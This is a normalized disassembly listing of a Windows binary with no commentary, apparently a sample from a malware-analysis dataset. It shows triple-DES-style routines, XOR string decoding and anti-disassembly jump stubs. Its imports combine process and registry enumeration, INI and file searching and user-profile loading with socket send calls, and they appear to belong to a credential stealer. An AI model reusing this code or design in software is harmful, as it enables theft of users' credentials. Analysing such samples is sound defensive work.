jne r-xdata
mov eax ecx
shl eax 0x1f
mov esi ecx
shr esi 0x1
mov ecx eax
or ecx esi
mov eax edx
xor eax ecx
mov ebx eax
and ebx 0xaaaaaaaa
xor edx ebx
xor ecx ebx
mov eax edx
shl eax 0x1f
mov esi edx
shr esi 0x1
mov edx eax
or edx esi
mov eax edx
shr eax 0x8
xor eax ecx
mov ebx eax
and ebx 0xff00ff
xor ecx ebx
mov eax ebx
shl eax 0x8
xor edx eax
mov eax edx
shr eax 0x2
xor eax ecx
mov ebx eax
and ebx 0x33333333
xor ecx ebx
mov eax ebx
shl eax 0x2
xor edx eax
mov eax ecx
shr eax 0x10
xor eax edx
mov ebx eax
and ebx 0xffff
xor edx ebx
mov eax ebx
shl eax 0x10
xor ecx eax
mov eax ecx
shr eax 0x4
xor eax edx
mov ebx eax
and ebx 0xf0f0f0f
xor edx ebx
mov eax [ ebp + 0x8 ]
shl ebx 0x4
xor ebx ecx
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41204a
push ebx
push esi
mov ebx [ esp + 0xc ]
mov si [ esp + 0x10 ]
test si si
sete cl
movzx eax cl
movzx eax ax
push eax
lea eax [ ebx + 0x8 ]
push eax
call sub_411ac0
push rw-data
call sub_411c80
movzx esi si
push esi
push ebx
call sub_411ac0
push rw-data
call sub_411c80
pop esi
pop ebx
retn 0x8
sub_41208e
push ebp
mov ebp esp
push eax
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
lea edx [ ebp - 0x8 ]
push edx
push eax
call sub_411cf1
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push ebx
lea eax [ ebp - 0x8 ]
push eax
call sub_411d5a
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4120df
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
call sub_411cf1
lea eax [ ebp - 0x10 ]
push eax
add ebx 0x8
push ebx
call sub_411cf1
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x10 ]
push eax
call sub_411da9
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ebx
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x10 ]
push eax
call sub_411da9
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ebx
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x10 ]
push eax
call sub_411da9
push esi
lea eax [ ebp - 0x8 ]
push eax
call sub_411d5a
add esi 0x8
push esi
lea eax [ ebp - 0x10 ]
push eax
call sub_411d5a
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41218f
push ebp
mov ebp esp
sub esp 0x18c
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x180 ]
push eax
call sub_41236a
push 0x0
push rw-data
call sub_41204a
xor edx edx
mov al [ edx + rw-data ]
mov [ edx + esi ] al
inc edx
cmp edx 0x8
jl r-xdata
mov [ ebp - 0x188 ] 0x1
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax esi
mov [ ebp - 0x18c ] eax
xor edx edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x0
jne r-xdata
cmp edx 0x8
jge r-xdata
lea eax [ ebp - 0x180 ]
push eax
call sub_4123ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push esi
call sub_41208e
and [ ebp - 0x188 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x18c ]
mov [ ebp - 0x184 ] eax
inc [ ebp - 0x18c ]
mov ecx [ ebp - 0x184 ]
movsx eax [ ebx ]
and eax 0x7f
mov edi [ ebp - 0x184 ]
movzx edi [ edi ]
xor eax edi
mov [ ecx ] al
mov [ ebx ] 0x0
inc ebx
inc edx
sub_41224d
push ebp
mov ebp esp
sub esp 0x18c
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x180 ]
push eax
call sub_41236a
push 0x0
push rw-data
call sub_41204a
xor edx edx
mov al [ edx + rw-data ]
mov [ edx + esi ] al
inc edx
cmp edx 0x10
jl r-xdata
mov [ ebp - 0x188 ] 0x1
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax esi
mov [ ebp - 0x18c ] eax
xor edx edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x0
jne r-xdata
cmp edx 0x10
jge r-xdata
lea eax [ ebp - 0x180 ]
push eax
call sub_4123ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push esi
call sub_4120df
and [ ebp - 0x188 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x18c ]
mov [ ebp - 0x184 ] eax
inc [ ebp - 0x18c ]
mov ecx [ ebp - 0x184 ]
movsx eax [ ebx ]
and eax 0x7f
mov edi [ ebp - 0x184 ]
movzx edi [ edi ]
xor eax edi
mov [ ecx ] al
mov [ ebx ] 0x0
inc ebx
inc edx
sub_41230b
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
mov bx [ esp + 0x14 ]
test bx bx
jne r-xdata
lea esi [ eax + 0x10 ]
mov edi eax
xor dx dx
mov esi eax
lea edi [ eax + 0x10 ]
mov dx 0x1
jmp r-xdata
movzx edx dx
push edx
add eax 0x8
push eax
call sub_411ac0
push rw-data
call sub_411c80
movzx ebx bx
push ebx
push edi
call sub_411ac0
push rw-data
call sub_411c80
movzx ebx bx
push ebx
push esi
call sub_411ac0
pop edi
pop esi
pop ebx
retn 0x8
sub_41236a
push ebx
mov ebx [ esp + 0x8 ]
push ebx
call sub_411c80
add ebx 0x80
mov eax rw-data
mov edx [ eax ]
mov [ ebx ] edx
add eax 0x4
add ebx 0x4
cmp eax rw-data
jb r-xdata
mov eax rw-data
mov edx [ eax ]
mov [ ebx ] edx
add eax 0x4
add ebx 0x4
cmp eax rw-data
jb r-xdata
pop ebx
retn 0x4
sub_4123ab
push ebx
mov ebx [ esp + 0x8 ]
push ebx
call sub_411c9e
add ebx 0x80
mov eax rw-data
mov edx [ ebx ]
mov [ eax ] edx
add ebx 0x4
add eax 0x4
cmp eax rw-data
jb r-xdata
mov eax rw-data
mov edx [ ebx ]
mov [ eax ] edx
add ebx 0x4
add eax 0x4
cmp eax rw-data
jb r-xdata
pop ebx
retn 0x4
sub_4123ec
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
call sub_411cf1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebx + 0x8 ]
push eax
call sub_411cf1
lea eax [ ebp - 0x18 ]
push eax
add ebx 0x10
push ebx
call sub_411cf1
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x10 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x18 ]
push eax
call sub_411da9
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x10 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x18 ]
push eax
call sub_411da9
mov ebx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x10 ]
push eax
call sub_411da9
push rw-data
lea eax [ ebp - 0x18 ]
push eax
call sub_411da9
push esi
lea eax [ ebp - 0x8 ]
push eax
call sub_411d5a
lea eax [ esi + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_411d5a
add esi 0x10
push esi
lea eax [ ebp - 0x18 ]
push eax
call sub_411d5a
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4124f8
push ebp
mov ebp esp
sub esp 0x18c
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x180 ]
push eax
call sub_41236a
push 0x0
push rw-data
call sub_41230b
xor edx edx
mov al [ edx + rw-data ]
mov [ edx + esi ] al
inc edx
cmp edx 0x18
jl r-xdata
mov [ ebp - 0x188 ] 0x1
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax esi
mov [ ebp - 0x18c ] eax
xor edx edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x0
jne r-xdata
cmp edx 0x18
jge r-xdata
lea eax [ ebp - 0x180 ]
push eax
call sub_4123ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push esi
call sub_4123ec
and [ ebp - 0x188 ] 0x0
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebp - 0x18c ]
mov [ ebp - 0x184 ] eax
inc [ ebp - 0x18c ]
mov ecx [ ebp - 0x184 ]
movsx eax [ ebx ]
and eax 0x7f
mov edi [ ebp - 0x184 ]
movzx edi [ edi ]
xor eax edi
mov [ ecx ] al
mov [ ebx ] 0x0
inc ebx
inc edx
sub_4125b6
push ebp
mov ebp esp
push eax
push eax
push ebx
push esi
mov edx [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
xor ecx ecx
mov al [ ecx + edx ]
mov [ ebp + ecx - 0x8 ] al
mov al [ ecx + edx ]
mov [ ecx + ebx ] al
inc ecx
cmp ecx 0x8
jl r-xdata
push ebx
push edx
call sub_41208e
xor edx edx
lea ecx [ edx + ebx ]
mov al [ edx + esi ]
xor al [ ecx ]
mov [ ecx ] al
inc edx
cmp edx 0x8
jl r-xdata
xor edx edx
mov al [ ebp + edx - 0x8 ]
mov [ edx + esi ] al
inc edx
cmp edx 0x8
jl r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_401011
push [ ebp + 0x8 ]
push 0x1
push 0x0
call CreateStreamOnHGlobal
leave
retn 0x4
sub_401133
push ebp
mov ebp esp
add esp 0xfffffffc
push ebp
mov ebp esp
pop ebp
push sub_401147
clc
jb r-xdata
retn
sub_40120d
push ebp
mov ebp esp
add esp 0xffffeff8
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ edx ]
retn
sub_40129a
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ edx + 0x2 ]
retn
sub_4012ad
push 0x0
push [ ebp + 0x8 ]
call sub_401047
leave
retn 0x4
sub_4012bb
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ edx ]
retn
sub_4012ce
push 0x0
push [ ebp + 0x8 ]
call sub_401047
leave
retn 0x4
sub_4012dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebp
mov ebp esp
pop ebp
push sub_4012f0
clc
jb r-xdata
retn
sub_40131f
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ edx ]
retn
sub_401332
push [ ebp + 0x8 ]
call sub_4012dc
leave
retn 0x4
sub_4014d1
push ebp
mov ebp esp
push 0x1
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40118c
leave
retn 0x8
sub_402301
push ebp
mov ebp esp
push 0x8
call sub_40184c
mov edx eax
push [ rw-data ]
pop [ edx ]
push [ ebp + 0x8 ]
pop [ edx + 0x4 ]
mov [ rw-data ] edx
leave
retn 0x4
sub_402387
push edi
mov edi [ rw-data ]
jmp r-xdata
or edi edi
jne r-xdata
push edi
mov edi [ edi ]
call sub_401835
mov [ rw-data ] 0x0
pop edi
retn
sub_402b47
push edi
push ebx
push ebp
mov ebp esp
pop ebp
push sub_402b57
clc
jb r-xdata
retn
sub_403dc0
push ebp
mov ebp esp
add esp 0xfffffe70
lea eax [ ebp - 0x18e ]
push eax
push 0x101
call WSAStartup
leave
retn
sub_404c21
push ebp
mov ebp esp
push 0xbeef0000
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_403e31
leave
retn 0x8
sub_408ede
cmp [ rw-data ] 0x0
je r-xdata
retn
push [ rw-data ]
call [ rw-data ]
add esp 0x4
call [ rw-data ]
mov [ rw-data ] 0x0
sub_40e58e
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e3ff
leave
retn 0xc
sub_40f96f
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push sub_40f980
clc
jb r-xdata
retn
sub_40f9b2
push ebp
mov ebp esp
add esp 0xfffffff8
push ebp
mov ebp esp
pop ebp
push sub_40f9c6
clc
jb r-xdata
retn
sub_40fae7
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push sub_40faf8
clc
jb r-xdata
retn
sub_4100d7
push ebp
mov ebp esp
add esp 0xfffffffc
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ edx ]
retn
sub_410171
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ edx ]
retn
sub_410184
call ExitProcess
sub_410192
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
[ eax + 0x71 ]
retn
_start
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
retn
CreateFileA
jmp [ CreateFileA@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
WriteFile
jmp [ WriteFile@IAT ]
lstrlenA
jmp [ lstrlenA@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LocalFree
jmp [ LocalFree@IAT ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
lstrcatA
jmp [ lstrcatA@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
ExpandEnvironmentStringsA
jmp [ ExpandEnvironmentStringsA@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
CreateFileMappingA
jmp [ CreateFileMappingA@IAT ]
MapViewOfFile
jmp [ MapViewOfFile@IAT ]
UnmapViewOfFile
jmp [ UnmapViewOfFile@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
CreateDirectoryA
jmp [ CreateDirectoryA@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32First
jmp [ Process32First@IAT ]
OpenProcess
jmp [ OpenProcess@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
lstrcmpiA
jmp [ lstrcmpiA@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindClose
jmp [ FindClose@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetWindowsDirectoryA
jmp [ GetWindowsDirectoryA@IAT ]
GetPrivateProfileStringA
jmp [ GetPrivateProfileStringA@IAT ]
SetCurrentDirectoryA
jmp [ SetCurrentDirectoryA@IAT ]
GetPrivateProfileSectionNamesA
jmp [ GetPrivateProfileSectionNamesA@IAT ]
GetPrivateProfileIntA
jmp [ GetPrivateProfileIntA@IAT ]
GetCurrentDirectoryA
jmp [ GetCurrentDirectoryA@IAT ]
lstrlenW
jmp [ lstrlenW@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
Sleep
jmp [ Sleep@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
LCMapStringA
jmp [ LCMapStringA@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
CreateStreamOnHGlobal
jmp [ CreateStreamOnHGlobal@IAT ]
GetHGlobalFromStream
jmp [ GetHGlobalFromStream@IAT ]
CoCreateGuid
jmp [ CoCreateGuid@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
OleInitialize
jmp [ OleInitialize@IAT ]
wsprintfA
jmp [ wsprintfA@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyA
jmp [ RegOpenKeyA@IAT ]
RegEnumKeyExA
jmp [ RegEnumKeyExA@IAT ]
RegCreateKeyA
jmp [ RegCreateKeyA@IAT ]
RegSetValueExA
jmp [ RegSetValueExA@IAT ]
IsTextUnicode
jmp [ IsTextUnicode@IAT ]
RegOpenCurrentUser
jmp [ RegOpenCurrentUser@IAT ]
RegEnumValueA
jmp [ RegEnumValueA@IAT ]
GetUserNameA
jmp [ GetUserNameA@IAT ]
InternetCrackUrlA
jmp [ InternetCrackUrlA@IAT ]
InternetCreateUrlA
jmp [ InternetCreateUrlA@IAT ]
StrStrIA
jmp [ StrStrIA@IAT ]
StrRChrIA
jmp [ StrRChrIA@IAT ]
StrToIntA
jmp [ StrToIntA@IAT ]
StrStrA
jmp [ StrStrA@IAT ]
StrCmpNIA
jmp [ StrCmpNIA@IAT ]
StrStrIW
jmp [ StrStrIW@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
socket
jmp [ socket@IAT ]
connect
jmp [ connect@IAT ]
closesocket
jmp [ closesocket@IAT ]
send
jmp [ send@IAT ]
select
jmp [ select@IAT ]
recv
jmp [ recv@IAT ]
setsockopt
jmp [ setsockopt@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
LoadUserProfileA
jmp [ LoadUserProfileA@IAT ]
UnloadUserProfile
jmp [ UnloadUserProfile@IAT ]
sub_411a52
mov eax 0xa0000
retn
sub_411a58
mov eax [ esp + 0x4 ]
mov ecx eax
shr ecx 0x3
lea eax [ eax + ecx + 0x40 ]
retn
sub_411c9e
mov eax [ esp + 0x4 ]
mov edx rw-data
mov ecx [ eax ]
mov [ edx ] ecx
add eax 0x4
add edx 0x4
cmp edx rw-data
jb r-xdata
retn 0x4
